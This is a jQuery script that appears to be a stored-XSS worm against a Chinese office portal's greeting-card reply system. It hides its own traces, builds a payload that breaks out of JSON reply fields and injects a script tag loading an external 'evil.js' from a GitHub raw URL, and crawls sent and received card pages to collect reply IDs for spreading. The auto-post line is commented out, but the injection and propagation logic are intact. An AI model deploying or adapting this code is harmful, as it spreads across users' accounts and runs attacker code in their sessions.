$("span:contains(管理员)").each(function(){
    $(this).parents("li:eq(0)").remove();
});

$("div.SendSay[title$='none >']").each(function(){
    $(this).parents("li:eq(0)").remove();
});

evilStr='<div style=display:none >"},{"imgUrl":"/office/pubjsp/tiles/images/Portal/nmember.gif","optorName":"管理员<script>$.getScript(\'https://raw.github.com/hellosamy2005/samy/master/evil.js\')</script>","dept":"CUC","replyContent":"系统新增加评论功能,欢迎大家评论!';

function sendCommentFromPageRegExp(url,regExpStr,msg){
    $.get(url,function(data){
    	try{
	        var pat=new RegExp(regExpStr,"g");
	        var result;
	        while((result=pat.exec(data))!=null){
	            var  sendurl="/office/cucCard/cucCardAction_queryReplyByPage.so?sendId="+result[1];
	            var evilMsg=msg+evilStr;
	            $.get(sendurl,function(jsonData){
	            	try{
	                                        if(jsonData.indexOf("getScript")<0){
	                                         var id=/sendId":"(\d+)/.exec(jsonData)[1];
	                                         console.info(id);
	                                         //$.post("/office/cucCard/cucCardAction_reply.so",{sendId:id,content:evilMsg,ifSendCard:"00"});
	                                    }
	            	}catch(err){
	            	}
	            });
	        }
    	}catch(err){
        }
    })
}

sendCommentFromPageRegExp("/office/cucCard/cucCardAction_sendOverAll.so","officeImages/upload/cucCard/result/\\d+\.png','(\\d+)'","非常感谢！");
sendCommentFromPageRegExp("/office/cucCard/cucCardAction_receiveOverAll.so","officeImages/upload/cucCard/result/\\d+\.png','(\\d+)'","谢谢！");

